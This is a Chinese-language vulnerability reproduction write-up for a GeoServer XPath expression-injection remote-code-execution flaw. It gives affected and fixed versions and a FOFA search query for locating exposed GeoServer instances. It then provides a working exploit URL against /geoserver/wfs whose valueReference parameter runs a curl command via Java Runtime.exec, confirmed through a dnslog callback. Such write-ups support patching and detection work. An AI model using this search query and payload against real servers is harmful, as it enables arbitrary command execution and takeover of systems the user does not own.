**漏洞名称**

Geoserver XPath 表达式注入致远程代码执行漏洞

**漏洞影响**

影响范围

2.25.0 <= GeoServer < 2.25.2

2.24.0 <= GeoServer < 2.24.4

GeoServer < 2.23.6



安全版本

GeoServer 2.25.2

GeoServer 2.24.4

GeoServer 2.23.6

**漏洞描述**

GeoServer是一个功能齐全,遵循OGC开放标准的开源WFS-T和WMS服务器。在/geoserver/wfs接口处发现了一个表达式注入致命令执行漏洞，攻击者可构造恶意请求利用该漏洞执行任意java代码，控制服务器。

**FOFA搜索语句**

```
app="GeoServer"
```

**漏洞复现**

第一步，使用浏览器访问/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage 路径获取typeNames的值

```url
http://x.x.x.x/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage?1
```

第二步，在此借助DNSlog来复现，先在http://dnslog.pw/dns随机搞个域名，使用浏览器访问如下路径，其中curl+0lbw6s5w.dnslog.pw表示向随机生成的dnslog子域名发送请求。

```url
http://x.x.x.x/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=satview%3Achina_line_sate&valueReference=exec(java.lang.Runtime.getRuntime(),'curl+0lbw6s5w.dnslog.pw')
```

